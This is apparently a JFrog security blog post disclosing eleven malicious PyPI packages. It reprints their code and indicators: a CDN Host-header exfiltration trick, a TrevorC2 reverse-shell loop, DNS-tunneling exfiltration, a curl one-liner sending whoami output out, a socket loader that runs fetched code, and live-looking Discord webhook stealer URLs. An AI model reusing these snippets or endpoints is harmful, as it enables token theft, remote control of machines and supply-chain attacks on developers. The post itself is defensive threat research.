@@ -1,0 +1,164 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214546_260441\PyPIMalwareRound2863x3001.png
+
+The JFrog Security research team continuously monitors popular open source software (OSS) repositories with our automated tooling to report vulnerable and malicious packages to repository maintainers. Earlier this year we disclosed several malicious packages targeting developers’ private data that were downloaded approximately 30K times. Today, we will share details about 11 new malware packages that we’ve recently discovered and disclosed to the PyPI maintainers (who promptly removed them).
+Based on our latest findings, in this blogpost we highlight some of the more advanced techniques used by Python malware developers to avoid detection and remain in the repository in order to infect as many machines as possible.
+Reported Packages
+
+Package	# of
+
+downloads¹	Automated detection indicators	Description
+importantpackage
+
+important-package	6305
+
+12897	Shell process with obfuscated input	Hidden connectback shell to psec.forward.io.global.prod.fastly.net, using the trevorc2 client
+pptest	10001	Suspicious version²	Uses DNS to send hostname+'|'+os.getcwd()+'|'+str(self.get_wan_ip())+'|'+local_ip_str
+ipboards	946	Sensitive file handling
+Suspicious version	Dependency confusion, sends user info (username, hostname) via DNS tunneling to b0a0374cd1cb4305002e.d.requestbin.net
+owlmoon	3285	eval with obfuscated input	Discord token stealer trojan. Sends tokens to
+https://discord.com/api/webhooks/875931932360331294/wA0rLs3xX_2JgqlfqEfpYoL9zer_Qs7hpsMbwaDl6-UByE_ZRHiXm0t1lr-o_3RFBqBR
+DiscordSafety	557	exec with obfuscated input	Discord token stealer trojan. Sends tokens to
+https://tornadodomain.000webhostapp.com/stlr.php?token=
+trrfab	287	Sensitive file handling
+Suspicious version	Dependency confusion, sends user info (id, hostname, /etc/passwd, /etc/hosts, /home) to yxznlysc47wvrb9r9z211e1jbah15q.burpcollaborator.net
+10Cent10
+
+10Cent11	490
+
+490	Shell spawning
+Suspicious version	Connectback shell to hardcoded address 104.248.19.57
+yandex-yt	4183	Suspicious version	Prints pwned message and directs to https://nda.ya.ru/t/iHLfdCYw3jCVQZ, could be a malicious domain (currently seems inactive)
+yiffparty	1859	eval with obfuscated input	Discord token stealer trojan. Sends tokens to
+https://discord.com/api/webhooks/875931932360331294/wA0rLs3xX_2JgqlfqEfpYoL9zer_Qs7hpsMbwaDl6-UByE_ZRHiXm0t1lr-o_3RFBqBR
+¹ Taken directly from pepy.tech
+
+² Version number indicative of a dependency confusion attack
+importantpackage – Connectback shell with novel exfiltration
+importantpackage contains malicious code that uses a couple of neat techniques to evade network-based detection.
+Abusing CDN TLS termination for data exfiltration
+The first technique is to use the Fastly CDN to disguise communications with the C2 server as a communication with pypi.org. The malware’s communication is quite simple:
+url = "https://pypi.python.org" + "/images" + "?" + "guid=" + b64_payload
+r = request.Request(url, headers = {'Host': "psec.forward.io.global.prod.fastly.net"})
+This code causes an HTTPS request to be sent to pypi.python.org (which is indistinguishable from a legitimate request to PyPI,) which later gets rerouted by the CDN as an HTTP request to the C2 server psec.forward.io.global.prod.fastly.net (and vice versa, allowing for two-way communication).
+So, the outgoing encrypted request will look like this –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214546_260441\1_outgoingencryptedrequest.png
+
+(note the communication uses all the original cryptographic parameters for pypi.org)
+But after going through the CDN, the backend (C2) server will receive the request unencrypted:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214546_260441\2_backendserverunencryptedrequest.png
+
+How and why does this work?
+We can see from the following diagram –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214546_260441\3_abusingCDNTLSterminationfordataexfiltration.jpg
+
+The PyPI infrastructure is hosted on the Fastly CDN. This hosting uses the Varnish transparent HTTP proxy to cache the communication between clients and the backend. The traffic first goes into a TLS terminator for decryption³, so the Varnish proxy can inspect the contents of the HTTP packet. The proxy analyzes the HTTP headers from the user’s request and redirects the request to the corresponding backend according to the Host header. The process then repeats itself in the reverse direction, allowing the malware to imitate duplex communication with PyPI.
+As a result, the command & control (C2) session is encrypted and signed with a legitimate server certificate, making it indistinguishable from communicating with legitimate PyPI resources.
+³ The TLS terminator holds the TLS private (decryption) key for the relevant host, in this case pypi.org
+Note it is extremely easy to register your domain with Fastly, and can even be done anonymously to an extent (since the service is free until you reach a certain threshold of traffic). Thus, this technique does not require any special resources from the attacker’s side.
+That being said, we do not label this technique as a software vulnerability in Fastly, since it is reasonable to assume that the Host  header is not malformed. Adding stateful packet inspection checks to counteract this technique can be very impactful on data throughput, which should be the CDN’s primary consideration.
+Taking into consideration all of the above, this technique does have its limitations. For example, when constructing an XHR, according to the RFC the Host header cannot be manipulated by the script constructing the XHR. This is fortunate, since otherwise cookies could have been leaked by a malicious webpage, by relying on the TLS termination in order to receive decrypted data from a user’s request which is otherwise encrypted with the TLS key of the intended host (ex. pypi.org).
+HTTP-based command & control using TrevorC2
+Besides the Hosts header technique, the malware developers used the TrevorC2 framework to implement a masked command and control client. Using this framework, the client contacts the server in a way that looks similar to standard website browsing, making the traffic even more obscure. The client sends requests with a random interval and hides the payload into typical HTTP GET requests. For example, a typical request has the following form: https://pypi.python.org/images/guid=<base64_encoded_payload>.
+The malware starts communication with the C2 server, sending a request containing the hostname of the infected machine. If the server decides to continue the session, the malware establishes a reverse shell over HTTP, giving the attacker full control over an infected machine.
+This can be seen in the following snippet –
+html = req.get(SITE_URL + ROOT_PATH_QUERY)
+parse = html.decode().split("")[0]
+if hostname in parse:
+    parse = parse.split(hostname + "::::")[1]
+    # execute our parsed command
+    proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout_value = proc.communicate()[0]
+    stdout_value = (hostname + "::::" + str(stdout_value)).encode('utf-8')
+    stdout_value = base64.b64encode(stdout_value).decode('utf-8')
+    # pipe out stdout and base64 encode it then request via a query string parameter
+    html = req.post(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING, data = stdout_value)
+ipboards & pptest – Exfiltration via DNS-tunneling
+Another popular type of network evasion used by malware developers is DNS tunneling. Although not a new technique, this is the first time we’re seeing this evasion method used in malicious packages uploaded to PyPI. As it follows from its name, this technique uses DNS requests as a channel for communication between the victim machine and the C2 server.
+When a DNS server receives the request with the domain, it tries to find the corresponding IP address in its database. If there’s no record about this domain, the server redirects the request to the first known domain in the address.
+Thus, an attacker can encode information to send to the C2 server in ASCII, prepend it to the name of his/her own domain and send a DNS query. The (legitimate) DNS server will redirect this package to the C2 server.
+For example, the following malicious code can be found in the ipboards package:
+# Encode gathered information as an hex-string
+payload=ip+';'+username+';'+hostname+';'+str(now)+';'+path+';'+packagename+';'+hostFile
+payload=hexlify(bytes(payload))
+ 
+# Breaks the payload into 50-byte chunks
+chunks = [payload[i:i+50] for i in range(0, len(payload), 50)]
+ 
+# Send chunks via DNS requests
+for chunk in chunks:
+    dns.resolver.query(pd.decode("utf-8") +dnss,'A')
+This code might generate domain names such as the following: 69703a75736572617474686576756c6e657261626c656d616368696e65.b0a0374cd1cb4305002e.d.requestbin.net. This domain name will be sent as part of a DNS query to a legitimate DNS server.
+Because the DNS server doesn’t know the address of the entire domain, but knows the address of b0a0374cd1cb4305002e.d.requestbin.net, it will redirect the entire request to this domain (which is the C2 server) and the C2 server can fish out the payload from the prefix string – 69703a75736572617474686576756c6e657261626c656d616368696e65
+owlmoon and DiscordSafety – Trojans that Hijack Discord Tokens
+As presented in our previous blogpost, a lot of malicious packages target Discord users, stealing their authentication tokens. Most of these malicious packages are based on well-known open-source “stealer utilities” and are not very interesting from a technical point of view. However, sometimes they are a bit more creative in terms of evasion.
+An interesting example we saw involves hiding the malicious code as a dependency. The malware consists of two parts:
+
+A malicious package that steals tokens and is relatively easy to detect
+A “legitimate” package, which may be installed through typosquatting or dependency confusion, that  doesn’t contain any harmful functionality. Rather, it simply specifies the malicious package to be imported (upon installation) as part of the install_requires keyword of distutils (in setup.py):
+install_requires=[  
+    'requests',
+    'beautifulsoup4',
+    'owlmoon',
+]
+In this case, owlmoon is the malicious package that contains the actual Discord token hijacking logic.
+Bug-bounty-seeking “malware” packages
+After Alex Birsan proved that supply chain misconfiguration can fetch substantial bounties, bug hunters started to flood repositories with their packages, trying to capitalize on typosquatting and dependency confusion vulnerabilities. An example from this spring – the user remindsupplychainrisks uploaded 5000+ copycat packages into PyPI and npm repositories. These kinds of packages appear in repositories all the time – usually, they have relatively harmless functionality, simply sending non-PII data about the system after the package was installed (so that the author might claim the bounty):
+os.system('curl https://898b5ca5e76134be965acd[.]bufferover[.]run/yow_utils/$(whoami | base64)/$(hostname -f | base64)')
+In other cases, it’s difficult to distinguish them from malware. For example, the package distutil is clearly trying to perform a typosquatting attack on the well-known package distutils. The package does have a description of “don’t download this”, but this description is not visible when installation is triggered via a typographical error made when invoking pip (either via the command line or a requirements.txt file). Moreover, the functionality of the distutil package has an extremely high security impact (more than is necessary to claim a bug bounty). Immediately after installation, the package tries to connect to an IP address, reads an encoded payload from it and executes the payload as Python code:
+import socket,zlib,base64,struct,time
+for x in range(10):
+    try:
+     s=socket.socket(2,socket.SOCK_STREAM)
+     s.connect(('192.168.1.69',4444))
+     break
+    except:
+     time.sleep(5)
+l=struct.unpack('>I',s.recv(4))[0]
+d=s.recv(l)
+while len(d)
+Although our malicious code detectors flagged quite a lot of these packages, we do not wish to report all of them, since we at JFrog Security support these bug bounty efforts. Therefore, we will only report such packages in the following cases, where they are borderline malware:
+
+The package description did not explicitly mention this package is for security testing purposes
+The package payload performs an unnecessarily invasive operation (ex. connectback shell, reporting back sensitive data such as passwords, etc.)
+Conclusion
+While this set of malicious packages may not have the same ‘teeth’ as our previous discoveries, what’s notable is the increasing level of sophistication with which they are executed. It’s not reaching for your wallet in broad daylight – but there is a lot more subterfuge going on with these packages, and some of them may even be setting up for a follow-up attack after the initial reconnaissance, instead of running a highly-compromising payload to start.
+Stay Tuned
+In addition to exposing new security vulnerabilities and threats, JFrog provides developers and security teams easy access to the latest relevant information for their software with automated security scanning by JFrog Xray. Keep following us for product updates including automated vulnerability and malicious code detection to defend against the latest emerging threats.
+Questions? Thoughts? Contact us at research@jfrog.com for any inquiries.
+Read More:
+
+Python cheat sheet
+Python repository
+ARTIFACTORY: What to Do When You Can’t Connect to pypi.python.org
+JFrog Detects Malicious PyPI Packages Stealing Credit Cards and Injecting Code
+
+
+hostname+'|'+os.getcwd()+'|'+str(self.get_wan_ip())+'|'+local_ip_str
+
+Suspicious version
+eval
+
+https://discord.com/api/webhooks/875931932360331294/wA0rLs3xX_2JgqlfqEfpYoL9zer_Qs7hpsMbwaDl6-UByE_ZRHiXm0t1lr-o_3RFBqBR
+exec
+
+https://tornadodomain.000webhostapp.com/stlr.php?token=
+
+Suspicious version
+
+Suspicious version
+eval
+
+https://discord.com/api/webhooks/875931932360331294/wA0rLs3xX_2JgqlfqEfpYoL9zer_Qs7hpsMbwaDl6-UByE_ZRHiXm0t1lr-o_3RFBqBR
+importantpackage
+Host
+69703a75736572617474686576756c6e657261626c656d616368696e65.b0a0374cd1cb4305002e.d.requestbin.net
+b0a0374cd1cb4305002e.d.requestbin.net
+69703a75736572617474686576756c6e657261626c656d616368696e65
+install_requires
+setup.py
+remindsupplychainrisks
+distutil
+distutils
+pip
+distutil
